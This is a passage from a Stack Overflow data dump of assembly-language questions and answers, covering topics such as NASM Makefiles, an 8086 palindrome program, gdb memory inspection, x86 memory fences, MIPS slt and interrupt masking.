  c_decls.h:6: Error: suffix or operands invalid for 'int'</p>
</blockquote>

<p>Is there a way to <code>#include</code> a C header file that contains function declarations in an assembly file?  (Changing the header or moving/redefining the <code>#define</code> is not an option.)</p>
","<p>Use the <code>-dM</code> option for <code>cpp</code> to get just the #defines out of your header files, and include that file instead.</p>

<pre><code>cpp -dM c_decls.h &gt; bare_c_decls.h
</code></pre>

<p>Now include <code>bare_c_decls.h</code> in your .S file.  And if you can't change the #include in the .S file, generate the bare header files in another directory, and put that include path on your compiler/assembler command line, ahead of everything else.</p>

<p>And finally, you can wrap this all up in a makefile so your ""bare"" header files are generated automatically.</p>
","4928277"
"How does 'label' work in assembler?","10263","","<p>What does this assembler code do?</p>

<pre><code>someName label word
         dw 8dup(0)
</code></pre>

<p>How does <code>label</code> work?</p>
","<p>Typically <code>label</code> creates a symbolic name for the code/data that follows and also assigns it a type. It's similar to defining a variable with given name and type/size. But it does not actually allocate space for it. It can be used to create aliases to variables.</p>
","8890622"
"How to make a Makefile for a program for assembly Language?","10259","","<p>I've come across this task to build a Makefile for a program in assembly language I made (nothing fancy, like a hello world). The program is in Linux 32 bits and I'm using NASM assembler. So far I can only find Makefiles for programs for C, I'm aware that there's not much difference from one to another but I'm not familiar with this thing. What I have is this: </p>

<pre><code>Program: main.o
    gcc -o Program main.o
main.o: main.asm
    nasm -f elf -g -F stabs main.asm
</code></pre>

<p>I can't tell whether this is correct or, if it does, how it works. I can't try the code because this computer doesn't have Linux. I really would like to know what's going on in the code.</p>
","<p>First of all, read <a href=""http://www.gnu.org/software/make/manual/html_node/Introduction.html"" rel=""noreferrer"">an introduction to Makefile</a>.</p>

<p>Your Makefile is read by the <code>make</code> program on invocation. It executes either the given rule (e.g. <code>make clean</code>) or executes the default one (usually <code>all</code>).</p>

<p>Each rule has a name, optional dependencies, and shell code to execute.</p>

<p>If you use objects file you usally start your Makefile like that:</p>

<pre><code>all: main.o
    gcc -o PROGRAM_NAME main.o
</code></pre>

<p>The dependency here is <code>main.o</code>, so it must be resolved before the execution of the code. Make searches first for a file named <code>main.o</code> and use it. If it doesn't exist, it search for a rule permitting to make the file.</p>

<p>You have the following:</p>

<pre><code>main.o: main.asm
    nasm -f elf -g -F stabs main.asm
</code></pre>

<p>Here the rule to make <code>main.o</code> depends on <code>main.asm</code>, which is your source file so I think it already exists. The code under the rule is then executed and has to make the file matching the rule name.
If your <code>nasm</code> invocation is correct, then the file is created and the code of the <code>all</code> (or <code>Program</code> as you named it) is executed.</p>

<p>So your Makefile <em>should</em> work, you just have to test it to be sure :) It is barely the same as invoking:</p>

<pre><code>nasm -f elf -g -F stabs main.asm &amp;&amp; gcc -o Program main.o
</code></pre>

<p>As a side note, you can still test this on windows as long as you have all the tools installed. The <a href=""http://www.cygwin.com/"" rel=""noreferrer"">cygwin</a> project provides an environment where you can install <code>make</code>, <code>gcc</code> and <code>nasm</code>.</p>
","18654559"
"8086 masm program for palindrome checking","10253","","<pre><code>.code
&gt; 
&gt;     start:
&gt;     mov ax,03h
&gt;     int 10h
&gt;     mov ax,seg msg1
&gt;     mov ds,ax
&gt;     mov dx,offset msg1
&gt;     mov ah,09h
&gt;     int 21h
&gt;     mov si,offset str
&gt;     read:
&gt;     mov ah,01h
&gt;     int 21h
&gt;     cmp al,0dh
&gt;     je next
&gt;     mov [si],al
&gt;     inc si
&gt;     inc count
&gt;     jmp read
&gt;     next:
&gt;     mov di,offset str
&gt;     mov al,count
&gt;     mov cl,al
&gt;     mov ch,00h
&gt;     dec si
&gt;     check:
&gt;     mov al,[si]
&gt;     cmp al,[di]
&gt;     jne nt
&gt;     dec si
&gt;     inc di
&gt;     loop check
&gt;     mov ax,seg msg2
&gt;     mov ah,09h
&gt;     int 21h
&gt;     jmp exit
&gt;     nt:
&gt;     mov ax,seg msg3
&gt;     mov ds,ax
&gt;     mov dx,offset msg3
&gt;     mov ah,09h
&gt;     int 21h
&gt;     exit:
&gt;     mov ax,4c00h
&gt;     int 21h
&gt;     END start
</code></pre>

<p>This is part of 8086 masm code for checking whether a string is a palindrome or not.msg1 is 'Enter string',msg2 is 'string is palindrome',msg3 is 'string is not palinrome'
What does 'cmp al,0dh' performs in this code?</p>
","<p>It's not mentioned where this code came from, but it's incomplete (<em>e.g.</em> as Mario points out: no <code>next:</code> label) present. But we can piece it together:</p>

<pre><code>.code

start:
    mov ax,03h           ; Get cursor position and shape
    int 10h

    ; Display a message to the user
    ; (NOTE: we only know it's in ""msg1"" but don't know the contents
    ;
    mov ax,seg msg1      ; DS:DX to point to msg1
    mov ds,ax
    mov dx,offset msg1

    mov ah,09h           ; Write the string (pointed by DS:DX) to stdout
    int 21h

    mov si,offset str    ; Get the the destination string location, DS:SI

    ; Read a string in from the user, terminated by new line (0dh)
    ;
read:
    mov ah,01h           ; Read a character
    int 21h

    cmp al,0dh           ; if it's a line feed, then go to ""next""
    je next


    mov [si],al          ; otherwise, store the char in ""str"" and get the next one
    inc si
    inc count            ; increment character count
    jmp read

    ; Below is where the actual code to compute a palindrome starts
next:
    mov di,offset str
    mov al,count
    mov cl,al
    mov ch,00h
    dec si
check:
    mov al,[si]
    cmp al,[di]
    jne nt
    dec si
    inc di
    loop check

    mov ax,seg msg2
</code></pre>

<p>So all this code does is display a message to the user prompting them to enter a string, terminated by a line feed (0dh) and it reads the string in (to location <code>str</code>). It also provides the number of characters read in <code>count</code>. Where <code>str</code>, <code>count</code>, and <code>msg1</code> are defined aren't given.</p>
","21064741"
"How to use ARM Assembly code in an Android project?","10250","","<p>I'm not particularly experienced with Assembly and ARM, but I was able to write a few routines in it and I'd like to see how they run on an ARM-equipped Android device (Nexus S). What is the procedure for including an Assembly code file into an Android project? Can I only call it from native code, or from Java also?</p>
","<p>You can call assembly from Android using the Java Native Interface and the Android NDK.</p>

<p>Cedric mentions using the <strong>asm</strong> keyword, while I prefer to include assembly source code. I have posted a tutorial to do this at my site:
<a href=""http://www.eggwall.com/2011/09/android-arm-assembly-calling-assembly.html"">http://www.eggwall.com/2011/09/android-arm-assembly-calling-assembly.html</a></p>

<p>You can download the source code for my example and see how it works. Once you see a functioning example, it is easy to modify it to your needs.</p>
","7448380"
"Meaning of 0x8($rsp)","10247","","<p>My first time learning Assembly Lang. Here is a part of (gdb) disassembly:</p>

<pre><code>mov    $0x131,%eax
cmp    0x8(%rsp),%eax  //Question here, what is the value of 0x8(%rsp)?




(gdb)i r
rax            0x131    305
rbx            0x7fffffffe578   140737488348536
rcx            0x20     32
rdx            0x7fffffffe478   140737488348280
rsi            0x0      0
rdi            0x1999999999999999       1844674407370955161
rbp            0x0      0x0
rsp            0x7fffffffe470   0x7fffffffe470
r8             0x37ed3bb080     240203313280
r9             0x0      0
r10            0x1e     30
r11            0x0      0
r12            0x400cb0 4197552
r13            0x7fffffffe570   140737488348528
r14            0x0      0
r15            0x0      0
rip            0x400fd9 0x400fd9 &lt;phase_3+129&gt;
eflags         0x212    [ AF IF ]
cs             0x33     51
ss             0x2b     43
ds             0x0      0
es             0x0      0
fs             0x0      0
</code></pre>

<p>I have trouble figuring out what does it compare. and what is the value of <code>0x8(%rsp)</code>.</p>

<p>(I know this question sounds like stupid)</p>

<p>Thanks in advance</p>

<p>=-==========</p>

<p>Finally I solved by </p>

<pre><code>(gdb) p /x *(int *)($rsp+0x8)
</code></pre>

<p>with the help of this post <a href=""https://stackoverflow.com/questions/5455832/how-to-print-0x4rbp-in-gdb"">How to print -0x4(%rbp) in gdb?</a></p>

<p>Zack's answer should be right, but it is not working since I'm using a 64 bit OS.</p>
","<p>Parentheses generally mean to dereference. 0x8(%rsp) means ""get the location on the stack that is 8 bytes away from the stack pointer %rsp, and then take the value at that address.""<br>
It moves 0x131 into %eax, and then compares it to the data at that location. cmp sets the <code>eflags</code> register depending on that comparison (like the Zero Flag if the operands were equal, etc.) <br>
To see what is at the address using GDB, type</p>

<pre><code>(gdb) x/1dw 0x8(%esp)
</code></pre>

<p>This command 'x' examines memory. <br>
1 means examine 1 of whatever unit is specified.<br>
""d"" means output in decimal notation (as opposed to hex). I don't know what type of data you are making a comparison to, so you might use ""c"" to get a char, or ""x"" to get a hex, or ""s"" for a string, or whatever.<br>
""w"" provides the unit, in this case a word, which is 4 bytes.<br>
So this command looks at 4 bytes at the given address, 0x8(%rsp), and prints whatever is there in decimal format. <br>
To learn more about using GDB to see how your memory is changing, see <a href=""http://sourceware.org/gdb/onlinedocs/gdb/Memory.html"" rel=""nofollow"">this document.</a></p>
","19748104"
"64-bit windows assembler","10232","","<p>I want to program 64 bit windows assembly (preferably using NASM). I have looked quite a but on google but it seems that I cannot find a 64 bit windows compiler. Some site mentioned ml64 but it seems like it is no longer included in VC++.  I have tried with 32 bit assembly, but obviously it just crashes on my 64 bit machine. Is it possible to write, compile and run 32 bit assembly applications on a 64 bit windows machine? Or should it be written and compiled for 64 bits?</p>

<p>Thanks.</p>
","<p>Yasm(*) is a modern, multi-platform NASM-rewritten assembler which is capable of assembling for both x86 and AMD64/x86-64 instruction sets.</p>

<p>However... What you probably mean is that you need a <strong>linker</strong> to link the assembled object code/file(s) to create an executable file. At least the completely free MinGW(Minimal GNU for Windows) project package ships with a linker(called ld) capable of assembling both 32- and 64-bit Windows executables from object files(ELF and PE object format, at least).</p>

<p>You can definitely cross-compile/build 32-bit projects in a 64-bit environment and vice versa, given that you supply correct command-line parameters to the assembler and the linker. Please refer to the documentation of the tools of your choise for more precise details.</p>

<p>*) <a href=""http://yasm.tortall.net/"">http://yasm.tortall.net/</a></p>
","10712768"
"Does it make any sense instruction LFENCE in processors x86/x86_64?","10224","","<p>Often in internet I find that <code>LFENCE</code> makes no sense in processors x86, ie it does nothing , so instead <code>MFENCE</code> we can absolutely painless to use <code>SFENCE</code>, because <code>MFENCE</code> = <code>SFENCE</code> + <code>LFENCE</code> = <code>SFENCE</code> + <code>NOP</code> = <code>SFENCE</code>.</p>

<p>But if <code>LFENCE</code> does not make sense, then why we have four approaches to make Sequential Consistency in x86/x86_64:</p>

<ol>
<li><code>LOAD</code> (without fence) and <code>STORE</code> + <code>MFENCE</code></li>
<li><code>LOAD</code> (without fence) and <code>LOCK XCHG</code></li>
<li><code>MFENCE</code> + <code>LOAD</code> and <code>STORE</code> (without fence)</li>
<li><code>LOCK XADD</code> ( 0 ) and <code>STORE</code> (without fence)</li>
</ol>

<p>Taken from here: <a href=""http://www.cl.cam.ac.uk/~pes20/cpp/cpp0xmappings.html"">http://www.cl.cam.ac.uk/~pes20/cpp/cpp0xmappings.html</a></p>

<p>As well as performances from Herb Sutter on page 34 at the bottom: <a href=""https://skydrive.live.com/view.aspx?resid=4E86B0CF20EF15AD!24884&amp;app=WordPdf&amp;wdo=2&amp;authkey=!AMtj_EflYn2507c"">https://skydrive.live.com/view.aspx?resid=4E86B0CF20EF15AD!24884&amp;app=WordPdf&amp;wdo=2&amp;authkey=!AMtj_EflYn2507c</a></p>

<p>If <code>LFENCE</code> did not do anything, then the approach (3) would have the following meanings: <code>SFENCE + LOAD and STORE (without fence)</code>, but there is no point in doing <code>SFENCE</code> before <code>LOAD</code>. Ie if <code>LFENCE</code> does nothing , the approach (3) does not make sense.</p>

<p>Does it make any sense instruction <code>LFENCE</code> in processors x86/x86_64?</p>

<p><strong>ANSWER:</strong></p>

<p><strong>1.</strong> <code>LFENCE</code> required in cases which described in the accepted answer, below.</p>

<p><strong>2.</strong> The approach (3) should be viewed not independently, but in combination with the previous commands. For example, approach (3):</p>

<pre><code>MFENCE
MOV reg, [addr1]  // LOAD-1
MOV [addr2], reg  //STORE-1

MFENCE
MOV reg, [addr1]  // LOAD-2
MOV [addr2], reg  //STORE-2
</code></pre>

<p>We can rewrite the code of approach (3) as follows:</p>

<pre><code>SFENCE
MOV reg, [addr1]  // LOAD-1
MOV [addr2], reg  //STORE-1

SFENCE
MOV reg, [addr1]  // LOAD-2
MOV [addr2], reg  //STORE-2
</code></pre>

<p>And here <code>SFENCE</code> makes sense to prevent reordering  STORE-1 and LOAD-2. For this after STORE-1 command <code>SFENCE</code> flushes Store-Buffer.</p>
","<p>Bottom line (TL;DR): <code>LFENCE</code> alone indeed seems useless for memory ordering, however it does not make <code>SFENCE</code> a substitute for <code>MFENCE</code>. The ""arithmetic"" logic in the question is not applicable.</p>

<hr>

<p>Here is an excerpt from <a href=""https://www-ssl.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-system-programming-manual-325384.pdf"" rel=""nofollow noreferrer"">Intel's Software Developers Manual, volume 3</a>, section 8.2.2 (the edition 325384-052US of September 2014), the same that I used in <a href=""https://stackoverflow.com/questions/19093137/does-x86-sse-instructions-have-an-automatic-release-acquire-order/27302931#27302931"">another answer</a></p>

<blockquote>
  <ul>
  <li>Reads are not reordered with other reads.</li>
  <li>Writes are not reordered with older reads.</li>
  <li>Writes to memory are not reordered with other writes, with the following exceptions:
  
  <ul>
  <li>writes executed with the CLFLUSH instruction;</li>
  <li>streaming stores (writes) executed with the non-temporal move instructions (MOVNTI, MOVNTQ, MOVNTDQ, MOVNTPS, and MOVNTPD); and</li>
  <li>string operations (see Section 8.2.4.1).</li>
  </ul></li>
  <li>Reads may be reordered with older writes to different locations but not with older writes to the same location.</li>
  <li>Reads or writes cannot be reordered with I/O instructions, locked instructions, or serializing instructions.</li>
  <li>Reads cannot pass earlier LFENCE and MFENCE instructions.</li>
  <li>Writes cannot pass earlier LFENCE, SFENCE, and MFENCE instructions.</li>
  <li>LFENCE instructions cannot pass earlier reads.</li>
  <li>SFENCE instructions cannot pass earlier writes.</li>
  <li>MFENCE instructions cannot pass earlier reads or writes.</li>
  </ul>
</blockquote>

<p>From here, it follows that:</p>

<ul>
<li><code>MFENCE</code> is a full memory fence for all operations on all memory types, whether non-temporal or not. </li>
<li><code>SFENCE</code> only prevents reordering of writes (in other terminology, it's a StoreStore barrier), and is only useful together with non-temporal stores and other instructions listed as exceptions.</li>
<li><code>LFENCE</code> prevents reordering of reads with subsequent reads and writes (i.e. it combines LoadLoad and LoadStore barriers). However, the first two bullets say that LoadLoad and LoadStore barriers are always in place, no exceptions. Therefore <code>LFENCE</code> alone is useless for memory ordering.</li>
</ul>

<p>To support the last claim, I looked at all places where <code>LFENCE</code> is mentioned in all 3 volumes of Intel's manual, and found none which would say that <code>LFENCE</code> is required for memory consistency. Even <code>MOVNTDQA</code> - the only non-temporal load instruction so far - mentions <code>MFENCE</code> but not <code>LFENCE</code>.</p>

<p>Whether <code>MFENCE</code> is equivalent to a ""sum"" of other two fences or not is a tricky question. At glance, among the three fence instructions only <code>MFENCE</code> provides StoreLoad barrier, i.e. prevents reordering of reads with earlier writes. However the correct answer requires to know more than the above rules; namely, it's important that all fence instructions are ordered with respect to each other. This makes the <code>SFENCE LFENCE</code> sequence more powerful than a mere union of individual effects: this sequence also prevents StoreLoad reordering (because loads cannot pass <code>LFENCE</code>, which cannot pass <code>SFENCE</code>, which cannot pass stores), and thus constitutes a full memory fence (but also see the note (*) below). Note however that order matters here, and the <code>LFENCE SFENCE</code> sequence does not have the same synergy effect.</p>

<p>However, while one can say that <code>MFENCE ~ SFENCE LFENCE</code> and <code>LFENCE ~ NOP</code>, that does not mean <code>MFENCE ~ SFENCE</code>. I deliberately use equivalence (~) and not equality (=) to stress that arithmetic rules do not apply here. The mutual effect of <code>SFENCE</code> followed by <code>LFENCE</code> makes the difference; even though loads are not reordered with each other, <code>LFENCE</code> is required to prevent reordering of loads with <code>SFENCE</code>.</p>

<p>(*) It still might be correct to say that <code>MFENCE</code> is stronger than the combination of the other two fences. In particular, a note to <code>CLFLUSH</code> instruction in the volume 2 of Intel's manual says that ""<code>CLFLUSH</code> is only ordered by the <code>MFENCE</code> instruction. It is not guaranteed to be ordered by any other fencing or serializing instructions or by another <code>CLFLUSH</code> instruction.""</p>
","27608800"
"Is assembly the only low level programming language, and if not is it the most widely used?","10191","","<p>I've started learning assembly recently and as I've looked across the internet I see more and more people saying that assembly is not useless, but it's also not worth the time to program things in a language that requires such time and effort compared to high level languages.  Is the efficiency between a high level language program and a low level one really not even noticeable enough to pay attention to nowadays, and is there another low level language like assembly that is more widely used?</p>
","<blockquote>
  <p>Is the efficiency between a high level language program and a low
  level one really not even noticeable enough to pay attention to
  nowadays</p>
</blockquote>

<p>Oftentimes, compilers generate a lot better assembly than developers can write. There are certain developers who can beat the compiler. But since writing low-level code requires more attention to details and is harder to write and maintain, it is usually only a small specific pieces of code that get implemented in assembly for efficiency. The difference can be noticeable. But it also can be not-noticable if developers do false-optimizations.</p>

<p>I'd recommend you read Michael <a href=""http://rads.stackoverflow.com/amzn/click/1576101746"" rel=""noreferrer"">Abrash's Graphics Programming Black Book</a> — it has a lot on assembly and optimizations + nice stories from real-life.</p>

<blockquote>
  <p>and is there another low level language like assembly that is more widely used?</p>
</blockquote>

<p>Assembler is probably the lowest level <em>application</em> programming language. The only other resort would be to write binary code by hand, but binary opcodes can hardly be called a ""language"".</p>

<p>However, programming goes beyond software. Hardware needs to be programmed, too. There are hardware description languages (HDL) that can be used to program hardware (i.e. you can create your own CPU). The most popular HDL languages are <a href=""http://en.wikipedia.org/wiki/Verilog"" rel=""noreferrer"">Verilog</a> and <a href=""http://en.wikipedia.org/wiki/VHDL"" rel=""noreferrer"">VHDL</a>.</p>
","11619105"
"Why is Set on Less Than an ALU operaion","10190","","<p>Why is <code>slt</code> considered an ALU operation? I thought it will just do a subtract then get the *<em>Z</em>*ero output from ALU?</p>

<pre>
 ALU control lines |     Function
-------------------+-------------------
       0000        |       AND
       0001        |       OR
       0010        |       add
       0110        |     subtract
       0111        | set on less than
</pre>

<p>Or is the ALU supposed to output 1 if the result of <code>A - B</code> (in <code>slt $t1, A, B</code>) is negative. </p>
","<p>It's supposed to output 1 if A is less than b and 0 otherwise. This often entails calculating A - B, which you need the ALU for.</p>

<p>Now if it was just calculating the sign bit of <code>A - B</code> it would be redundant, but consider the case where <code>A = -2147483648 = 0x80000000</code> and <code>B = 1 = 0x00000001</code>, here the subtraction result will be <code>0x7fffffff = 2147483647</code>, which does not have the most significant bit set even though <code>A &lt; B</code>.</p>

<p>As the table is from ""Patterson, David A.; Hennessy, John L.: Computer Organization and Design"" I'll refer you to chapter 3, specifically the subsection that deals with ""addition and subtraction"" (3.3 in the 2nd edition, 3.2 in the 4th). It has a table dealing with overflow/underflow where the corner cases can be looked up. </p>

<p>Also remember that the ALU result is 32 bits, so even if the result was just the sign bit of the subtraction result it would still need a different ALU operation code to signal that 31 zeros concatenated with the result bit should be returned rather than the full subtraction result.</p>

<p>The ""Zero"" line you're probably referring to is - in the architectures discussed in the book - IIRC only used for comparisons in relation to branch equal / branch not equal. <code>SLT/SLTI</code> on the hand stores its result in a register. </p>
","7858379"
"How to disable/enable interrupts on a stm32f107 chip?","10187","","<p>I have an ARM stm32f107 chip. I'm porting a project from IAR to GCC</p>

<p>IAR provides the following functions to enable and disable interrupts:</p>

<pre><code>#define __disable_interrupt() ...
#define __enable_interrupt() ...
</code></pre>

<p>How do I enable / disable interrupt for my chip using GCC?</p>
","<p>I can't answer for ARM but the same function in Coldfire boils down to setting/clearing the Interrupt Priority Level masking register in the CPU. Setting it to the highest number disables/ignores all but non-maskable, setting it to 0 enables all (YMMV).</p>

<p>Worth noting that it's handy to read-back the value when ""disabling"" and restore when ""enabling"" to ensure that stacked interrupts don't break each other:</p>

<pre><code>ipl = DisableInts(); // Remember what the IPL was
&lt;""Risky"" code happens here&gt;
EnableInts(ipl); // Restore value
</code></pre>

<p>This is useful when twiddling interrupt masks, which may cause spurious interrupts, or doing stuff that shouldn't be interrupted.</p>

<p>Functions come out as:</p>

<pre><code>uint8 DisableInts(void)
{
    return(asm_set_ipl(7));
}

uint8 EnableInts(uint8 ipl)
{
    return(asm_set_ipl(ipl));
}
</code></pre>

<p>Both of which map to this asm:</p>

<pre><code>asm_set_ipl:
_asm_set_ipl:
/* Modified for CW7.2! */
    link    A6,#-8
    movem.l D6-D7,(SP)

    move.l  D0,D6           /* save argument                 */

    move.w  SR,D7           /* current sr                    */

    move.l  D7,D0           /* prepare return value          */
    andi.l  #0x0700,D0      /* mask out IPL                  */
    lsr.l   #8,D0           /* IPL                           */

    andi.l  #0x07,D6        /* least significant three bits  */
    lsl.l   #8,D6           /* move over to make mask        */

    andi.l  #0x0000F8FF,D7  /* zero out current IPL          */
    or.l    D6,D7           /* place new IPL in sr           */
    move.w  D7,SR

    movem.l (SP),D6-D7
    //lea     8(SP),SP
    unlk    A6
    rts
</code></pre>
","13720554"
"How are everyday machines programmed?","10182","","<p>How are everyday machines (not so much computers and mobile devices as appliances, digital watches, etc) programmed? What kind of code goes into the programming of a Coca-Cola vending machine? How does my coffee maker accept a pre-programmed time and begin brewing a pot of coffee hours later, when that time arrives?</p>

<p>Do these kinds of machines have operating systems inside of them, or is it something even more basic? Are they written in Assembly, C, or some other language?</p>

<p>And, I would really like to find some resource that lists these operating systems or underlying code systems, possibly even with source code if possible. If anyone knows of such a resource (searching yielded nothing for me), that would be fantastic.</p>
","<p>Most of what you're talking about are embedded based systems where C is a luxury often not available.  They don't have software in the traditional sense.  Most of the time the software is written in C, assembly, or even machine code.  C and ASM require compilers to be written to use them for that platform.  Machine code is written as binary w/o a compiler.  </p>

<p>Your coffee pot and most simple systems like that don't carry an operating system.  They simply load from a start address in memory and you put your code there.  Often these systems have their ""code"" burned into EEPROMS that act as the hard drive of the system.  Screw up the code after burning the proms, <strike>throw the chips away</strike> reburn the code on the chip, and start over.  There are newer chips FPGA that higher end devices use to make testing, deploying, etc easier, but they are the same thing. </p>

<p>Coca-cola machines, routers, etc. typically use a realtime OS like QNX, EMBOS, or sometimes RTlinux if you're lucky.  Most of these are proprietary OS you license for lots of money, but they have C compilers, drivers to work with hardware, etc.</p>

<p><a href=""http://www.qnx.com/"" rel=""noreferrer"">http://www.qnx.com/</a></p>

<p><a href=""http://www.segger.com/cms/embos.html"" rel=""noreferrer"">http://www.segger.com/cms/embos.html</a></p>

<p><a href=""http://www.microsoft.com/windowsembedded/en-us/campaigns/compact7/default.aspx?WT.srch=1&amp;WT.mc_ID=SEARCH"" rel=""noreferrer"">http://www.microsoft.com/windowsembedded/en-us/campaigns/compact7/default.aspx?WT.srch=1&amp;WT.mc_ID=SEARCH</a></p>

<p>RTLinux</p>
","5616328"
"calling assembly functions from c","10171","","<p>I'm trying to use a function in assembly, invoked from a C project.  This function is supposed to call a libc function let's say <code>printf()</code>, but I keep getting a segmentation fault.</p>

<p>In the .c file I have the declaration of the function let's say</p>

<pre><code>int do_shit_in_asm()
</code></pre>

<p>In the .asm file I have</p>

<pre><code>.extern printf
.section .data
         printtext:
              .ascii ""test""
.section .text
.global do_shit_in_asm
.type do_shit_in_asm, @function

do_shit_in_asm:
    pushl %ebp
    movl %esp, %ebp
    push printtext
    call printf
    movl %ebp, %esp
    pop %ebp
ret
</code></pre>

<p>Any <strike>pointers</strike> comments would be appreciated.</p>

<pre><code>as func.asm -o func.o

gcc prog.c func.o -o prog
</code></pre>
","<p>Change <code>push printtext</code> to <code>push $printtext</code>.</p>

<p>As it is, you're loading a value from the address <code>printtext</code> and pushing that, rather than pushing the address. Thus, you're passing <code>'test'</code> as a 32-bit number, rather than a pointer, and <code>printf</code> is trying to interpret that as an address and crashing.</p>
","4676714"
"What type of applications/projects can I create using Assembly Language?","10135","","<p>I am in my third semester of my university. I hardly know anything about writing assembly languages: I just used MASM and wrote <code>mov</code> and <code>add eax,var1</code> sorts of instructions.</p>

<p>Can we create programs in Assembly Language similar to what we can do in C/C++?</p>

<p>Can you please recommend any sample projects that have been built using Assembly?</p>
","<p>You can write any kind of application in assembler.  The primary difference between it and other languages such as C (and what is likely confusing you) is that Assembler is extremely low level.  It takes many, many instructions in assembly to do what can easily be done in a single line of code in C.  This is, in essence, why languages such as C were created; to make writing programs quicker and easier since they can do in 1 line what it takes many, many assembly instructions to do.  You also have to understand a lot about how the computer ""thinks"" to write an assembly program.</p>

<p>The big up-side to assembly is that it is just flat out fast.  C and other languages have to make assumptions about what you are trying to do to save you time.  In assembly, you can avoid all of the extra overhead that comes from those assumptions, which makes your program very, very fast.</p>

<p>It is well worth learning some assembler in college as it gives you a very big insight into how the computer is ""thinking"" and what benefits C and other languages are really providing for you.</p>
","13406112"
"Compare arrays of characters in x86 assembly","10132","","<p>I'm trying to compare 2 strings to see if they're equal in assembly. Case sensitive. They're passed in from a cpp wrapper. Here is what I have so far:</p>

<p>I stored one string in esi, the other in edi:</p>

<pre><code>LOOP:
    mov al, [esi + edx*4]
    mov bl, [edi + edx*4]
    sub al, bl
    INC edx
    je LOOP
    jmp END_LOOP  ; if it's not equal, do some stuff at the end

END_LOOP:
</code></pre>

<p>What am I doing wrong? How does it know when I'm at the end of a char array?</p>
","<p>Since these strings are C++ strings, and I'm guessing they are made of <code>char</code>s and not wide characters, then each character is one byte in size so you should not be multiplying the index register <code>edx</code> by 4.  Also, you cannot increment <code>edx</code> before <em>immediately</em> before your <code>je</code> instruction, because that only jumps is edx has been bumped to zero.</p>

<p>Finally, the strings end with a 0 byte.  So you are looking for either <code>al</code> or <code>bl</code> to be zero to know when to stop your loop.</p>

<p>You can modify your code along these lines:</p>

<pre><code>    xor edx, edx         ; make sure edx is 0 to start with
LOOP:
    mov al, [esi + edx]
    mov bl, [edi + edx]
    inc edx              ; prepare for next char
    cmp al, bl           ; compare two current characters
    jne DIFFERENT        ; not equal, get out, you are DONE!
    cmp al, 0            ; equal so far, are you at the end?
    je SAME              ; got to end of both strings, you're good, get out
    jmp LOOP             ; okay well they agree so far, go to next char
DIFFERENT:
    ; Do what you need to do for the strings being different
    ;
    ;
    jmp DONE
SAME:
    ; Do what you need to do for the strings being the same
    ;
    ;
DONE:
</code></pre>

<p>However I suggest just doing a search for string comparison in x86.  There is a <code>cmps</code> instruction.  You can even arrange to call the <code>strncmp</code> function if you like.  There are several ways to go about this.</p>
","11663839"
"How can I make a pure assembly project in Visual Studio?","10124","","<p>How can I make a masm project in Visual Studio? I remember doing this in class a while back, but I've since forgotten, and Google is only getting me inline assembly.</p>
","<p>Start with the Win32 Console mode project template.  Delete the .cpp files.  Right-click the project in the Solution Explorer window, Custom Build Rules, check Microsoft Macro Assembler.  In VS2015 use Build Dependencies, Build Customizations, check masm.</p>

<p>Add a new .asm file by right-clicking the Source Files node, Add, Code, C++ File, be sure to use the .asm extension.  In the property window change the File Type to C/C++ Code so it gets passed to the linker.</p>

<p>Linker settings, Manifest file, Generate = No.  With these settings I could build and debug this sample .asm file:</p>

<pre><code>.486
.MODEL FLAT
.CODE
START:
   ret
END START
</code></pre>
","2718833"
"Assembly Language: How to compare an input number in 8086?","10087","","<p>The problem is to ask a user to input any number. And compare the entered number with a pre-defined constant number. Then output a message that number the entered is either greater or less than or equal to the defined number. In this example my predefined number is 27.</p>

<p>My code is:</p>

<pre><code>   .MODEL small
   .STACK 100h
   .DATA
promptmsg DB 'Please enter a number [1..100]',13,10,'$'
greatermsg db 'You have entered a greater number', 13, 10, '$'
lessmsg db 'You have entered a lesser number', 13 , 10, '$'
correctmsg db 'You have hit the right number', 13, 10, '$'
numbr dw 27
   .CODE
   .startup
   mov  ax,@data
   mov  ds,ax                   
   lea dx, promptmsg
   mov  ah,9    
   int  21h                     
   mov ah, 0ah
   int 21h
   mov ah, 9
   int 21h
   mov bx, numbr
   cmp ax, bx
   jb lesser
   ja greater
correct:
   mov dx, offset correctmsg
   mov ah, 09h
   int 21h
   jmp endexe
greater:
   mov dx, offset greatermsg
   mov ah, 09h
   int 21h
   jmp endexe
lesser:
   mov dx, offset lessmsg
   mov ah, 09h
   int 21h
endexe:
   mov  ah,4ch                 ;DOS terminate program function
   int  21h                    ;terminate the program
   END
</code></pre>

<p>If I input any number regardless it is greater or less than or equal to the predefined number, it always jumps to greater. Is there any problem with my code, that failed to recognize my input number? </p>

<p>Update: Corrected the variable numbr instead of ans.</p>
","<p>I see this line in your code:</p>

<pre><code>mov bx, ans
</code></pre>

<p>However, I don't see 'ans' defined anywhere. Did you mean 'numbr'?</p>

<p>I see a few other problems. Your code seems to think that the result of int 21h/ah=0ah operation will return a number via the ax register. It won't. According to <a href=""http://spike.scu.edu.au/~barry/interrupts.html#ah0a"" rel=""nofollow"">the first reference I found</a> while googling, the operation returns a string in the buffer referenced by ds:dx. Which, BTW, your code does not explicitly establish-- when int 21h/ah=0ah, is called, ds:dx still points to promptmsg, so the operation will overwite the prompt.</p>

<p>So it looks like the code prints the prompt, asks for input, and then prints the input back to the user. By the time it gets to the comparison:</p>

<pre><code>cmp ax, bx
</code></pre>

<p>You have already put 9 into the upper half of ax, so it makes sense that the 'greater' path is always taken. But again, that doesn't matter, since the read instruction doesn't return input data via ax, but rather in the buffer pointed to by ds:dx.</p>

<p>However, even if you did load the first byte referenced by ds:dx, your code still would not work as you expect. You will need to convert a sequence of ASCII characters into a number. I.e., '9' -> 9, '100' -> 100. That will require a little more code.</p>
","15230032"
"What's the meaning of MOV EAX, DWORD PTR SS:[EBP+8h] and how can I translate it into AT&T format?","10080","","<p>I'm using Code::Blocks to code, but one of the code I referenced is from Visual C++,so I have difficulties on the difference...:(</p>

<p>the full code are here</p>

<pre><code>NAKED void ijlWrite()
{
__asm {
    PUSH    EBP
    MOV     EBP, ESP
    MOV     EAX, DWORD PTR SS:[EBP+8h]
    MOV     ECX, ssQuality
    MOV     DWORD PTR DS:[EAX+50h], ECX
    MOV     EDX, DWORD PTR SS:[EBP+0Ch]
    PUSH    EDX
    MOV     EAX, DWORD PTR SS:[EBP+08h]
    PUSH    EAX
    CALL    lpfnIJLWrite //a global variable
    POP     EBP
    RETN
}
}
</code></pre>

<p>I'll be very grateful if you translate them all.</p>

